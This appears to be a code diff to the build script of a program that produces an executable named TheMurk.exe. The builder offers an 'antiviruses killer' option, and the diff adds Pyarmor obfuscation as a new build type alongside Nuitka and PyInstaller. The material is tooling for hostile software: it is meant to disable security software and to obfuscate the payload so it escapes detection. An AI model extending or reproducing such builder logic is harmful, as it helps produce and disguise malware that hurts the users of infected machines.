@@ -74,8 +74,8 @@ class Builder():
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
             self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.builder = ""
-        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
-            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
+        while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
             self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
@@ -122,8 +122,8 @@ class Builder():
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
             self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.builder = ""
-        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
-            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
+        while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
             self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
@@ -170,8 +170,8 @@ class Builder():
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
             self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.builder = ""
-        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
-            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
+        while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
             self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
@@ -238,8 +238,16 @@ class Builder():
                         time.sleep(180)
                         os.chdir(f'{fullPath}')
                         shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
-        elif self.builder == "Pyinstaller":
+        if self.builder == "Pyinstaller":
             os.system('start CompilePyinstaller.bat')
+            while os.path.exists("dist/TheMurk.exe") == 0:
+                pass
+            if os.path.exists("dist/TheMurk.exe") == 1:
+                        time.sleep(5)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
+        if self.builder == "Pyarmor":
+            os.system('start CompilePyarmor.bat')
             while os.path.exists("dist/TheMurk.exe") == 0:
                 pass
             if os.path.exists("dist/TheMurk.exe") == 1:
@@ -288,7 +296,7 @@ class Builder():
                         time.sleep(180)
                         os.chdir(f'{fullPath}')
                         shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
-        elif self.builder == "Pyinstaller":
+        if self.builder == "Pyinstaller":
             os.system('start CompilePyinstaller.bat')
             while os.path.exists("dist/TheMurk.exe") == 0:
                 pass
@@ -296,8 +304,16 @@ class Builder():
                         time.sleep(5)
                         os.chdir(f'{fullPath}')
                         shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
+        if self.builder == "Pyarmor":
+            os.system('start CompilePyarmor.bat')
+            while os.path.exists("dist/TheMurk.exe") == 0:
+                pass
+            if os.path.exists("dist/TheMurk.exe") == 1:
+                        time.sleep(5)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
         shutil.rmtree(r'buildingCache', ignore_errors=True)
-        print("\033[33m{}\033[0m".format("(i) done"))
+        print("\033[33m{}\033[0m".format("(i) done"))   
         input("\033[33m{}\033[0m".format("(i) exit on enter..."))
 
 
@@ -339,8 +355,16 @@ class Builder():
                         time.sleep(180)
                         os.chdir(f'{fullPath}')
                         shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
-        elif self.builder == "Pyinstaller":
+        if self.builder == "Pyinstaller":
             os.system('start CompilePyinstaller.bat')
+            while os.path.exists("dist/TheMurk.exe") == 0:
+                pass
+            if os.path.exists("dist/TheMurk.exe") == 1:
+                        time.sleep(5)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
+        if self.builder == "Pyarmor":
+            os.system('start CompilePyarmor.bat')
             while os.path.exists("dist/TheMurk.exe") == 0:
                 pass
             if os.path.exists("dist/TheMurk.exe") == 1:
